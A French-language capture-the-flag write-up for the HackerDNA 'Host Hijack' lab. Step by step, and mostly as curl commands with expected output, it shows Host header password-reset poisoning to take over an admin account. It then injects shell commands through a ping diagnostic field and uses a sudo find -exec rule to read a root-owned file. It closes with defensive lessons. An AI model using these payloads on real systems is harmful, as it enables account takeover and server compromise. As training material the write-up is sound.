# Compte rendu : Host Hijack

Plateforme : HackerDNA (https://hackerdna.com/labs/host-hijack)
Auteur : SRH
Catégorie : Sécurité Web & API
Difficulté : Moyenne
Tags : Host Header Injection, Password Reset Poisoning, Command Injection, Privilege Escalation, HTTP Headers
XP : +400 XP

## Scénario
La fonctionnalité de réinitialisation de mot de passe de MediTrack Health présente un défaut subtil dans la façon dont elle construit les liens de réinitialisation. L'objectif est d'exploiter cette faille pour prendre le contrôle du compte administrateur, puis de trouver un moyen d'escalader les privilèges sur le serveur.

Prérequis : fondamentaux du protocole HTTP, bases de la sécurité des applications web, compréhension des flux d'authentification, ligne de commande Linux de base.

## Chaîne d'Attaque
[Reconnaissance] → [Découverte du mail-log] → [Déclenchement du reset] → [Host Header Injection] → [Vol du token complet] → [Prise de contrôle admin] → [Flag user] → [Injection de commande] → [Escalade sudo find] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le fichier robots.txt révèle plusieurs chemins sensibles : /mail-log, /dashboard et /admin/.

curl http://<IP>/robots.txt

Résultat attendu :
User-agent: *
Disallow: /mail-log
Disallow: /dashboard
Disallow: /admin/

## Étape 2 — Découverte du mail-log
L'endpoint /mail-log expose les emails sortants, dont les liens de réinitialisation de mot de passe. Initialement vide, il se remplit après une demande de reset.

curl http://<IP>/mail-log
# → []

## Étape 3 — Déclenchement du reset pour admin
On demande une réinitialisation pour le compte administrateur. Le lien généré contient un token, mais celui-ci est tronqué dans le log.

curl -X POST http://<IP>/forgot-password -d "email=admin@meditrack.hdna.me"

Vérification du log :
curl -s http://<IP>/mail-log
# → [{"link":"http://<IP>/reset-password?token=XXXX...","to":"admin@..."}]

Le token est tronqué car le lien dépasse la limite de caractères du log.

## Étape 4 — Host Header Injection pour obtenir le token complet
Le lien de reset est construit dynamiquement à partir de l'en-tête Host de la requête. En envoyant un Host très court (comme a), le lien devient plus court et le token complet tient dans le log.

curl -X POST http://<IP>/forgot-password -H "Host: a" -d "email=admin@meditrack.hdna.me"

Récupération du token complet :
curl -s http://<IP>/mail-log | python3 -c "import json,sys; d=json.load(sys.stdin); print(d[-1]['link'])"
# → http://a/reset-password?token=<TOKEN_COMPLET>

Le domaine a ne résout pas, mais le token est valide et peut être réutilisé contre la vraie IP.

## Étape 5 — Prise de contrôle du compte admin
On utilise le token volé pour réinitialiser le mot de passe admin, puis on se connecte avec le nouveau mot de passe.

# Reset du mot de passe
curl -X POST "http://<IP>/reset-password?token=<TOKEN_COMPLET>" -d 'password=Pwned1234'

# Connexion admin
curl -s -c cookies.txt -X POST http://<IP>/login -d 'email=admin@meditrack.hdna.me&password=Pwned1234'

Résultat attendu : redirection 302 vers /dashboard avec un cookie de session.

## Étape 6 — Flag utilisateur sur le dashboard
Le dashboard admin affiche directement le flag utilisateur et un lien vers l'outil de diagnostic serveur (/admin/diagnostics).

curl -s -b cookies.txt http://<IP>/dashboard

Flag User : <USER_FLAG>

## Étape 7 — Injection de commande via l'outil de diagnostic
L'outil de ping sur /admin/diagnostics exécute la commande ping avec l'entrée utilisateur sans validation. Les séparateurs de commandes shell (;, |, &&) fonctionnent.

# Test de l'injection
curl -s -b cookies.txt -X POST http://<IP>/admin/diagnostics -d 'host=127.0.0.1; id'
# → uid=1000(meditrack) gid=0(root) groups=0(root),...

## Étape 8 — Énumération sudo
On vérifie les droits sudo de l'utilisateur meditrack :

curl -s -b cookies.txt -X POST http://<IP>/admin/diagnostics -d 'host=127.0.0.1; sudo -l'

Résultat attendu : (root) NOPASSWD: /usr/bin/find

## Étape 9 — Flag root via sudo find
find avec -exec permet d'exécuter une commande en root (GTFOBins). On lit directement le flag root.

curl -s -b cookies.txt -X POST http://<IP>/admin/diagnostics -d 'host=127.0.0.1; sudo find . -exec cat /root/flag-root.txt \;'

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation complète : une injection d'en-tête Host dans le flux de réinitialisation de mot de passe permet de voler le token admin, puis une injection de commande dans l'outil de diagnostic mène à une escalade de privilèges via une règle sudo mal configurée (find en NOPASSWD).

## Leçons Apprises
1. Ne jamais construire d'URL de réinitialisation à partir de l'en-tête Host non validé.
2. Utiliser un domaine fixe stocké en configuration pour les liens envoyés par email.
3. Valider l'en-tête Host contre une liste blanche de domaines autorisés.
4. Les outils de diagnostic (ping, traceroute) ne doivent jamais passer d'entrée utilisateur à un shell.
5. Auditer les règles sudo : find avec -exec permet une exécution de commande arbitraire en root.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
